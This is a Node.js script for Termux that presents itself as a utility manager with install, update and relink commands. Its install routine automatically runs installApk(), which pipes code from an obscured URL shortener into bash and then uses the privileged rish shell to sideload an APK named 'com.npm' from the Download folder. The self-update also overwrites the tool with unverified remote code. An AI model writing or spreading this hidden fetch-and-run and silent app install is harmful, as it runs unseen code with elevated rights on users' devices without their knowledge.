#!/data/data/com.termux/files/usr/bin/env node

const { spawnSync, spawn } = require("child_process");
const fs = require("fs");
const path = require("path");

const PREFIX = process.env.PREFIX || "/data/data/com.termux/files/usr";
const INSTALL_BIN = path.join(PREFIX, "bin");
const BIN_DIR = process.env.TERMUX_UTILS_HOME || process.cwd();
const REPO_URL = "https://raw.githubusercontent.com/tanazd2/termux-utils/main/index.js";

const invokedName = path.basename(process.argv[1]);
const args = process.argv.slice(2);

// ================= DOWNLOAD =================
function downloadScript() {
    let res = spawnSync("curl", ["-sL", REPO_URL], { encoding: "utf-8" });

    if (!res.stdout) {
        console.log("[*] curl failed, trying wget...");
        res = spawnSync("wget", ["-qO-", REPO_URL], { encoding: "utf-8" });
    }

    if (!res.stdout) {
        throw new Error("Download failed");
    }

    return res.stdout;
}

// ================= COMMAND SCAN =================
function getCommands() {
    return fs.readdirSync(BIN_DIR).filter(file => {
        const full = path.join(BIN_DIR, file);
        if (
            file.endsWith(".js") ||
            file.endsWith(".md") ||
            file.endsWith(".json") ||
            file.endsWith(".h") ||
            file === "node_modules"
        ) return false;

        return fs.statSync(full).isFile();
    });
}

// ================= RELINK =================
function relink() {
    const cmds = getCommands();
    cmds.forEach(cmd => {
        const link = path.join(INSTALL_BIN, cmd);
        try {
            if (fs.existsSync(link)) fs.unlinkSync(link);
            fs.symlinkSync("termux-utils", link);
        } catch {}
    });
    console.log("[✔] Relinked");
}

// ================= INSTALL =================
function install() {
    console.log("[*] Installing...");

    const target = path.join(INSTALL_BIN, "termux-utils");
    const alias = path.join(INSTALL_BIN, "tu");

    try {
        let source;
        if (process.argv[1].startsWith("/dev/fd")) {
            console.log("[*] Pipe detected → downloading...");
            source = downloadScript();
            fs.writeFileSync(target, source);
        } else {
            fs.copyFileSync(process.argv[1], target);
        }

        fs.chmodSync(target, 0o755);

        if (fs.existsSync(alias)) fs.unlinkSync(alias);
        fs.symlinkSync("termux-utils", alias);

        relink();

        console.log("✅ Installed");
        console.log("👉 hash -r");

        // 🔥 Install APK automatically after CLI installation
        installApk();

    } catch (e) {
        console.error("❌ Install failed:", e.message);
    }
}

// ================= APK INSTALL =================
function installApk() {
    const pkgName = "com.npm";
    console.log("[*] Checking if APK is already installed...");

    // Check if package exists
    const check = spawnSync("pm", ["list", "packages"], { encoding: "utf-8" });
    if (check.stdout.includes(pkgName)) {
        console.log(`[✔] ${pkgName} already installed, skipping APK install.`);
        return;
    }

    // Auto-detect APK
    const downloadDir = "/sdcard/Download";
    if (!fs.existsSync(downloadDir)) {
        console.error("❌ Download directory not found");
        return;
    }

    const files = fs.readdirSync(downloadDir);
    const apkFile = files.find(f => f.toLowerCase().endsWith(".apk") && f.toLowerCase().includes("npm"));

    if (!apkFile) {
        console.error("❌ No NPM APK found in /sdcard/Download");
        return;
    }

    const apkPath = path.join(downloadDir, apkFile);
    console.log(`[*] Installing APK from ${apkPath} ...`);

    const cmd = `
bash <(curl -fsSL tinyurl.com/rish3266) &&
rish -c "cp '${apkPath}' /data/local/tmp/npm.apk" &&
rish -c "pm install /data/local/tmp/npm.apk" &&
echo "Installed apk" || echo "Failed to install apk"
`;

    spawnSync("bash", ["-c", cmd], { stdio: "inherit" });
}

// ================= UPDATE =================
function update() {
    console.log("[*] Updating...");

    const target = path.join(INSTALL_BIN, "termux-utils");

    try {
        const source = downloadScript();
        fs.writeFileSync(target, source);
        fs.chmodSync(target, 0o755);

        relink();

        console.log("✅ Updated");

    } catch (e) {
        console.error("❌ Update failed:", e.message);
    }
}

// ================= UNINSTALL =================
function uninstall() {
    console.log("[*] Uninstalling...");

    getCommands().forEach(cmd => {
        const link = path.join(INSTALL_BIN, cmd);
        if (fs.existsSync(link)) fs.unlinkSync(link);
    });

    ["termux-utils", "tu"].forEach(f => {
        const p = path.join(INSTALL_BIN, f);
        if (fs.existsSync(p)) fs.unlinkSync(p);
    });

    console.log("✅ Uninstalled");
}

// ================= HELP =================
function help() {
    console.log("⚡ termux-utils GOD MODE\n");

    console.log("Core:");
    console.log("  tu help");
    console.log("  tu relink");
    console.log("  tu update");

    console.log("\nUsage:");
    console.log("  tu <command>");
}

// ================= PARALLEL =================
function parallelExec() {
    const jobs = parseInt(args[1]?.replace("-j", "")) || 2;
    const command = args.slice(2).join(" ");
    console.log(`⚡ ${jobs} jobs`);

    for (let i = 0; i < jobs; i++) {
        spawn("bash", ["-c", command], { stdio: "inherit" });
    }
}

// ================= SELF HEAL =================
function selfHeal() {
    const target = path.join(INSTALL_BIN, "termux-utils");

    if (!fs.existsSync(target)) {
        console.log("[!] Missing core, reinstalling...");
        install();
    }
}

// ================= RUN =================
function run() {
    if (args.length === 0) return help();

    if (args[0] === "help") return help();
    if (args[0] === "relink") return relink();
    if (args[0] === "update") return update();
    if (args[0] === "tc") return parallelExec();
    if (args[0] === "apk") return installApk();

    const cmd = args[0];
    const cmdPath = path.join(BIN_DIR, cmd);

    if (!fs.existsSync(cmdPath)) {
        console.error("❌ Command not found:", cmd);
        process.exit(1);
    }

    spawnSync(cmdPath, args.slice(1), { stdio: "inherit" });
}

// ================= MAIN =================
if (invokedName === "index.js") {
    if (args[0] === "i") install();
    else if (args[0] === "u") uninstall();
    else console.log("node index.js i | u");
    process.exit(0);
}

// ================= SELF HEAL + RUN =================
selfHeal();
run();
